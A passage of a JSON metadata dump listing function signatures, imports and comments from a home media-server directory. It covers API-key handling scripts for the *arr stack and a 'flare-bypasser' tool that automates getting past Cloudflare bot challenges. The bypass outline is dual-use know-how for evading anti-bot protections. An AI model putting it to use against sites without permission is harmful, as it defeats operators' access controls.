          "def get_api_key_from_keychain(service: str) -> Optional[str]:\n\"\"\"Get API key from Keychain using arrkeyctl.\"\"\"\ntry:\nresult = subprocess.run(\n['/Users/davidquinton/bin/arrkeyctl', 'get', service],\ncapture_output=True,\ntext=True,\ncheck=True\n)\nreturn result.stdout.strip()",
          "def update_bazarr_config(config_path: str = \"/Users/davidquinton/docker-media/bazarr/config/config.yaml\"):\n\"\"\"Update Bazarr configuration with API keys and service settings.\"\"\"\nconfig_file = Path(config_path)\n\nif not config_file.exists():\nprint(f\"\u274c Bazarr config file not found: {config_path}\")\nreturn False\n\n# Load current configuration\ntry:",
          "def main():\n\"\"\"Main function.\"\"\"\nimport argparse\n\nparser = argparse.ArgumentParser(description='Update Bazarr configuration with API keys from Keychain')\nparser.add_argument('--config', default='/Users/davidquinton/docker-media/bazarr/config/config.yaml',\nhelp='Path to Bazarr config.yaml file')\nparser.add_argument('--dry-run', action='store_true',\nhelp='Show what would be updated without making changes')\n"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import yaml",
          "import subprocess",
          "from pathlib import Path",
          "from typing import Optional",
          "import argparse"
        ],
        "comments": [
          "# Service configurations for Docker environment",
          "# Load current configuration",
          "# Update each service",
          "# Get API key from Keychain",
          "# Update service configuration",
          "# Set API key",
          "# Set connection settings",
          "# Write updated configuration",
          "# TODO: Implement dry run functionality"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/arr-key-inventory.py",
        "docstrings": [],
        "function_defs": [
          "def extract_xml_api_key(config_path: Path, xpath: str) -> Optional[str]:\n\"\"\"Extract API key from XML config file.\"\"\"\ntry:\ntree = ET.parse(config_path)\nroot = tree.getroot()\napi_key_element = root.find(xpath.replace('.//',''))\nreturn api_key_element.text if api_key_element is not None else None\nexcept Exception as e:\nprint(f\"Error parsing {config_path}: {e}\")\nreturn None",
          "def extract_yaml_api_key(config_path: Path, key_path: list) -> Optional[str]:\n\"\"\"Extract API key from YAML config file.\"\"\"\ntry:\nwith open(config_path, 'r') as f:\ndata = yaml.safe_load(f)\n\n# Navigate through nested keys\ncurrent = data\nfor key in key_path:\nif isinstance(current, dict) and key in current:",
          "def inventory_api_keys(base_path: str = \"/Users/davidquinton/docker-media\") -> Dict[str, Any]:\n\"\"\"Inventory all API keys from arr stack services.\"\"\"\nbase_path = Path(base_path)\ninventory = {\n'base_path': str(base_path),\n'services': {},\n'summary': {\n'total_services': 0,\n'keys_found': 0,\n'keys_missing': 0",
          "def main():\n\"\"\"Main function to run the inventory.\"\"\"\nprint(\"\ud83d\udd0d *arr Stack API Key Inventory\")\nprint(\"=\" * 50)\n\ninventory = inventory_api_keys()\n\n# Display summary\nprint(f\"\\n\ud83d\udcca Summary:\")\nprint(f\"   Total services: {inventory['summary']['total_services']}\")"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import os",
          "import xml.etree.ElementTree as ET",
          "import yaml",
          "from pathlib import Path",
          "from typing import Dict, Any, Optional"
        ],
        "comments": [
          "# Service configurations",
          "# Navigate through nested keys",
          "# Display summary",
          "# Display service details",
          "# Export found keys for keychain import",
          "# Return the keys for programmatic use but don't write to disk"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/arr-stack-summary.py",
        "docstrings": [],
        "function_defs": [
          "def run_command(cmd, capture_output=True):\n\"\"\"Run a command and return the result.\"\"\"\ntry:\nreturn subprocess.run(cmd, capture_output=capture_output, text=True, check=True, shell=True)\nexcept subprocess.CalledProcessError as e:\nif capture_output:\nreturn e\nelse:\nraise\n",
          "def check_file_exists(path):\n\"\"\"Check if a file exists and is executable.\"\"\"\np = Path(path)\nreturn p.exists(), p.is_file() and p.stat().st_mode & 0o111\n\ndef main():\nprint(\"\ud83c\udf89 *arr Stack API Management System\")\nprint(\"=\" * 60)\nprint()\n",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import subprocess",
          "import sys",
          "from pathlib import Path"
        ],
        "comments": [
          "# Check component status",
          "# Show API key status",
          "# Parse the output and show just the key status lines",
          "# Show Docker status",
          "# Show available commands",
          "# Quick start suggestion"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@stable3',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser==0.2.7',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug4',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser-test',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# \"--disable-software-rasterizer\",",
          "# Disable certificates checking",
          "# browser_args += [\"--ignore-certificate-errors\", \"--ignore-urlfetcher-cert-requests\"]",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 25,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):",
          "def _platform_for_error() -> str:"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 30,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url, *args, **kwargs):",
          "def http_client(self) -> httpx.AsyncClient:",
          "def _init_client(self):"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):",
          "class CloudFlareBlocked(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare unsolvable block",
          "# check that it is cloud flare block",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class RunProxyCommandError(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/utils/drission_page_solver/drission_page_solver.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, driver: ChromiumPage, max_retries=-1, log=True):",
          "def search_recursively_shadow_root_with_iframe(self, ele):",
          "def search_recursively_shadow_root_with_cf_input(self, ele):",
          "def locate_cf_button(self):",
          "def log_message(self, message):",
          "def click_verification_button(self):",
          "def is_bypassed(self):",
          "def bypass(self):",
          "def bypass_cloudflare(url: str, retries: int, log: bool, proxy: str = None) -> ChromiumPage:",
          "def main():"
        ],
        "class_defs": [
          "class CloudflareBypasser:"
        ],
        "imports": [
          "import sys",
          "import logging",
          "import time",
          "import numpy as np",
          "import argparse",
          "import cv2",
          "from pyvirtualdisplay import Display",
          "from DrissionPage import ChromiumPage, ChromiumOptions, WebPage"
        ],
        "comments": [
          "# If the button is not found, search it recursively",
          "# Start Xvfb for Docker"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# Disable certificates checking",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 22,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 27,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/async_client.py",
